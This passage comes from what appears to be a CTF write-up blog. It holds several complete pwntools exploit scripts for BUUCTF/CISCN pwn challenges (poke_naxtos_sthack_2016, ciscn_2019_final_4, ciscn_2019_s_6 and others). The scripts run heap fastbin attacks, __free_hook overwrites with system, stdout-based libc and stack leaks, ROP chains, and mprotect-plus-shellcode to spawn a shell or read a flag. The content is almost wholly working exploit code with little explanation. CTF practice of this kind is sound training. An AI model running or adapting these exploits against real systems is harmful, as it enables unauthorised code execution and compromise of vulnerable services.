class="line">    payload &#x3D; payload.ljust(0x80,&#39;\x00&#39;)</span><br><span class="line">    payload +&#x3D; p64(0x80) + p64(0x100)</span><br><span class="line">    edit(3,0x100,payload)</span><br><span class="line">    free(4)</span><br><span class="line"></span><br><span class="line">    payload &#x3D; p64(0x100)</span><br><span class="line">    payload +&#x3D; p64(chunk_list) + p64(0x100)</span><br><span class="line">    payload +&#x3D; p64(elf.got[&#39;__libc_start_main&#39;]) + p64(0x100)</span><br><span class="line">    edit(3,0x100,payload)</span><br><span class="line">    show()</span><br><span class="line">    __libc_start_main &#x3D; ru7f()</span><br><span class="line">    libc &#x3D; __libc_start_main - lib.symbols[b&#39;__libc_start_main&#39;]</span><br><span class="line">    lib.address &#x3D; libc</span><br><span class="line">    system &#x3D; lib.symbols[b&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    __free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]</span><br><span class="line">    __malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]</span><br><span class="line">    __realloc_hook &#x3D; lib.symbols[b&#39;__realloc_hook&#39;]</span><br><span class="line">    one_gadget &#x3D; []</span><br><span class="line">    payload &#x3D; p64(lib.symbols[&#39;__free_hook&#39;]) + p64(0x100)</span><br><span class="line">    payload +&#x3D; p64(binsh) + p64(0x100)</span><br><span class="line">    edit(2,0x100,payload)</span><br><span class="line">    edit(0,0x100,p64(system))</span><br><span class="line">    free(1)</span><br><span class="line">    if awd &#x3D;&#x3D; False:</span><br><span class="line">        irt()</span><br><span class="line">def CTF_exploit(argv):</span><br><span class="line">    global remote_ip,remote_port,binary_file,remote_libc_file</span><br><span class="line">    argv_len &#x3D; len(argv)</span><br><span class="line">    context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">    ctx.binary &#x3D; binary_file</span><br><span class="line">    ctx.remote_libc &#x3D; remote_libc_file</span><br><span class="line">    ctx.custom_lib_dir &#x3D; &quot;&#x2F;tools&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.23-0ubuntu11_amd64&#x2F;&quot;</span><br><span class="line">    #ctx.debug_remote_libc &#x3D; True</span><br><span class="line">    if argv_len &#x3D;&#x3D; 1:</span><br><span class="line">        sh &#x3D; ctx.start()</span><br><span class="line">        exploit(sh)</span><br><span class="line">        return</span><br><span class="line">    elif argv_len &#x3D;&#x3D; 2:</span><br><span class="line">        if argv[1] &#x3D;&#x3D; &quot;remote&quot;:</span><br><span class="line">            ctx.debug_remote_libc &#x3D; False</span><br><span class="line">            </span><br><span class="line">            ctx.remote &#x3D; (remote_ip,remote_port)</span><br><span class="line">            sh &#x3D; ctx.start(&quot;remote&quot;)</span><br><span class="line">            exploit(sh,remote &#x3D; True)</span><br><span class="line">            return</span><br><span class="line">        elif argv[1] &#x3D;&#x3D; &quot;local&quot;:</span><br><span class="line">            sh &#x3D; ctx.start()</span><br><span class="line">            exploit(sh)</span><br><span class="line">            return</span><br><span class="line">        elif argv[1] &#x3D;&#x3D; &quot;awd&quot;:</span><br><span class="line">            context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">            ctx.remote &#x3D; (remote_ip,remote_port)</span><br><span class="line">            sh &#x3D; ctx.start(&quot;remote&quot;)</span><br><span class="line">            exploit(sh,remote &#x3D; True)</span><br><span class="line">            return</span><br><span class="line">    elif argv_len &#x3D;&#x3D; 3:</span><br><span class="line">        ctx.remote &#x3D; (argv[1],int(argv[2],10))</span><br><span class="line">        sh &#x3D; ctx.start(&quot;remote&quot;)</span><br><span class="line">        exploit(sh,remote &#x3D; True)</span><br><span class="line">        return</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; ctx.start()</span><br><span class="line">        exploit(sh)</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">    CTF_exploit(sys.argv)</span><br></pre></td></tr></table></figure>
<h2 id="0x48-poke-naxtos-sthack-2016">0x48 poke_naxtos_sthack_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;poke_naxtos_sthack_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;poke_naxtos_sthack_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">	sh.sendline(&quot;41&quot;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;pik4_p455&quot;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	offset &#x3D; 112</span><br><span class="line">	pop_ebp_ret &#x3D; 0x0804887f</span><br><span class="line">	payload &#x3D; offset*&quot;a&quot; + p32(elf.plt[&#39;puts&#39;]) + p32(pop_ebp_ret) + p32(elf.got[&#39;__libc_start_main&#39;]) + p32(elf.symbols[&#39;_start&#39;])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Cheat Activated !\n&quot;)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recvuntil(&quot;\xf7&quot;))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	sh.sendline(&quot;41&quot;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;pik4_p455&quot;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(system) + p32(pop_ebp_ret) + p32(0x080482DB)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20084,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x49-ciscn-2019-final-4">0x49 ciscn_2019_final_4</h2>
<h3 id="和ciscn-sw-10类似">和ciscn_sw_10类似</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_final_4_back&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,str(size))</span><br><span class="line">	sh.sendafter(&quot;?&quot;,content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">	sh.sendafter(&quot;what is your name?&quot;,content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_final_4_back&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	</span><br><span class="line">	inputName(p64(0x61) * (0xff &#x2F; 8))</span><br><span class="line">	add(0x68,&#39;\x11&#39; * 0x68)</span><br><span class="line">	add(0x68,&#39;\x12&#39; * 0x68)</span><br><span class="line">	payload &#x3D; &#39;\x13&#39; * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">	add(0x68,payload)	</span><br><span class="line">	add(0x88,&#39;\x14&#39; * 0x88)</span><br><span class="line">	add(0x38,&#39;\x15&#39; * 0x38)</span><br><span class="line">	add(0x38,&#39;\x15&#39; * 0x38)</span><br><span class="line">	add(0x58,&#39;%17$paaaa%54$p&#39;)</span><br><span class="line">	free(3)</span><br><span class="line">	show(3)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;)) - 88</span><br><span class="line">	libc &#x3D; main_arena - 0x10 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	stdout &#x3D; libc + lib.symbols[&#39;_IO_2_1_stdout_&#39;]</span><br><span class="line">	printf &#x3D; libc + lib.symbols[&#39;printf&#39;]</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	heap_base &#x3D; (u64(sh.recvuntil(&#39;\n--------------------&#39;,True)[-3:].ljust(8,&#39;\x00&#39;)) &gt;&gt; 8) &lt;&lt; 8</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3</span><br><span class="line">	payload +&#x3D; p64(0) * 6</span><br><span class="line">	payload +&#x3D; p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols[&#39;environ&#39;]) + p64(libc + lib.symbols[&#39;environ&#39;] + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	stack_end &#x3D; u64(sh.recvuntil(&quot;--------------------&quot;,True)[-8:])</span><br><span class="line">	canary_pos &#x3D; stack_end - (0x3258 - 0x3158)</span><br><span class="line">	fastbin_attack &#x3D; stack_end - 0x7fffffffe548 + 0x7fffffffe2e8 - 3</span><br><span class="line">	ret_addr &#x3D; stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3</span><br><span class="line">	payload +&#x3D; p64(0) * 6</span><br><span class="line">	payload +&#x3D; p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	canary &#x3D; u64(sh.recvuntil(&quot;--------------------&quot;,True)[-8:])</span><br><span class="line">	pop_rdi_ret &#x3D; libc + lib.search(asm(&quot;pop rdi\nret&quot;)).next()</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	offset &#x3D; 16</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3</span><br><span class="line">	payload +&#x3D; &#39;\x00&#39; * offset</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(0)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rsi\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(ret_addr)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rdx\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(0x100)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.symbols[&#39;read&#39;])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	offset &#x3D; 0x40 - 0x8</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * offset</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64((elf.bss() &gt;&gt; 12) &lt;&lt; 12)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rsi\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(0x2000)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rdx\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(7)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.symbols[&#39;mprotect&#39;])</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(0)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rsi\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(((elf.bss() &gt;&gt; 12) &lt;&lt; 12) + 0x800)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rdx\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(0x200)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.symbols[&#39;read&#39;])</span><br><span class="line">	payload +&#x3D; p64(((elf.bss() &gt;&gt; 12) &lt;&lt; 12) + 0x800)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	shellcode  &#x3D; shellcraft.amd64.openat(0,&quot;&#x2F;flag.txt&quot;,0)</span><br><span class="line">	shellcode +&#x3D; shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">	shellcode +&#x3D; shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(asm(shellcode))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20222,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x50-ciscn-2019-s-6">0x50 ciscn_2019_s_6</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_s_6&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,name,phone):</span><br><span class="line">	sh.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the size of compary&#39;s name&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;please input name:&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil(&quot;please input compary call:&quot;)</span><br><span class="line">	sh.send(phone)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_s_6&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	add(0xF0,&#39;a&#39; * 0x80,&#39;\x00&#39; * 0x4 + p64(0x61)) #idx 0</span><br><span class="line">	add(0x58,&#39;b&#39; * 0x58,&#39;\x00&#39; * 0x4 + p64(0x61)) #idx 1</span><br><span class="line">	add(0x58,&#39;c&#39; * 0x58,&#39;\x00&#39; * 0x4 + p64(0x61)) #idx 2</span><br><span class="line">	add(0x68,&#39;d&#39; * 0x68,&#39;\x00&#39; * 4 + p64(0x61))   #idx 3</span><br><span class="line">	add(0x68,&#39;e&#39; * 0x68,&#39;\x00&#39; * 4 + p64(0x61))   #idx 4</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	show(0)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;,False)[-6:].ljust(8,&#39;\x00&#39;)) - 88</span><br><span class="line">	libc &#x3D; main_arena - 0x10 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	__free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)</span><br><span class="line">	free(4)</span><br><span class="line">	free(3)</span><br><span class="line">	show(2)</span><br><span class="line">	heap_base &#x3D; u64(sh.recvuntil(&quot;\x0a\x70\x68&quot;,True)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">	heap_base &#x3D; (heap_base &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),&#39;\x00&#39; * 4 + p64(0x61)) #idx 5</span><br><span class="line">	add(0x58,&quot;&#x2F;bin&#x2F;sh\x00&quot;,&#39;\x00&#39; * 4 + p64(0x61)) #idx 6</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),&#39;\x00&#39; * 4 + p64(0x61)) #idx 7</span><br><span class="line">	for i in range(0,3):</span><br><span class="line">		add(0x68,p64(__free_hook - 0x43),&#39;\x00&#39; * 4 + p64(0x61)) #idx 8-10</span><br><span class="line">	payload  &#x3D; p64(0x21) + p64(heap_base + 0xe8) + p64(0x58) + p64(0) + p64(0x21)</span><br><span class="line">	payload +&#x3D; p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">	add(0x58,payload,&#39;\x00&#39; * 4 + p64(0x61))#idx 11</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3 + p64(0) * 6 + p64(system)</span><br><span class="line">	add(0x68,payload,&#39;\x00&#39; * 4 + p64(0x61)) #idx 12</span><br><span class="line">	free(6)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20157,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x51-ciscn-nw-4">0x51 ciscn_nw_4</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_nw_4&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,str(size))</span><br><span class="line">	sh.sendafter(&quot;?&quot;,content)</span><br><span class="line">def show(idx):</span><br><span class="line">	